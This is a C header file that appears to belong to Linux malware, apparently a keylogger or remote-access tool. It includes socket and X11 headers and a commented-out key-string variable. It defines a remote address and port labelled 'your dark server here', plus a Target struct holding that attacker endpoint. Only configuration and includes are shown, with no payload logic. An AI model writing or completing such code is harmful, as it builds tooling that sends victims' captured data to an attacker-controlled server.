#ifndef _MAIN_H
#define _MAIN_H

#include "execfuncs.h"

/* Basic libraries */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <time.h>

/* Sockets */

//#ifdef _WIN32
//#include <winsock2.h>
//#include <windows.h>
 //#pragma comment(lib,"ws2_32.lib")

//#else

#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <fcntl.h>
#include <X11/Xlib.h>


#define remote_addr "0.0.0.0" /* your dark server here */
#define remote_port 3389

//#define focusWin

#define true 1
#define false 0

extern char *__progname;

//extern char * szKeyString;


/* struct of configurations to target. */

  typedef struct {

  int REMOTE_ADDR; /*remote_addr */
  int REMOTE_PORT; /* remote port */


  } Target;

  //int x = true;


#endif // _MAIN_H

